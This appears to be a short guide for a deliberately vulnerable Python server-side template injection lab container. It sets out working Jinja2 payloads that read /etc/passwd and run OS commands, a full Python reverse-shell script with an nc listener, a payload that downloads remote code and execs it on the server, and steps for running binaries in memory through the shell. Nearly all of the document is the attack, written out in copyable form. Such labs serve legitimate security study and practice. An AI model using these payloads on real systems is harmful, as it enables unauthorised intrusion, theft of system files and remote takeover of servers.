### Build distroless
```bash
docker build . -t py-ssti-dless
docker start -p 8080:8080 py-ssti-dless
```

### Raw image (no distroless)
```bash
docker run -it python:3.10-slim sh
```

### Read File
`http://127.0.0.1:1337/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}`

### RCE
`http://127.0.0.1:1337/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["__import__"]("os").popen("command -v python").read()}}`

### Get python rev shell

Create a file called `python_rev.py` with your **IP address** and **port**:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.17.0.3",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/usr/bin/python","-i"])
```

Start a listener on your machine:

```bash
nc -lvnp 4444
```

Now, lets make the server **exec** the python file **downloading it via http**:
```python
http://127.0.0.1:1337/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["exec"]((1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["__import__"]("urllib", fromlist=["request"]).request.urlopen("http://172.17.0.3:8989/tmp/python_rev.py").read())}}
```

**You should have received the python shell!**


### Execute arbitrary binaries

Generate the payload to load in memory with `fee /bin/ls > ls.py`. **AND UPDATE** the payload with the following code at the beggining **or you will lose your shell**:

```python
# imports ...
pid = os.fork()
if pid == 0: #pid==0 represents the child process
# Rest of the payload inside this if
```

**If you want to execute the binary with more params, add them in the last line of the payload**

In your python reverse shell run this to **download and execute the binary**:

```python
from urllib import request
ls = request.urlopen("http://172.17.0.3:8989/tmp/ls.py").read()
exec(ls)
```
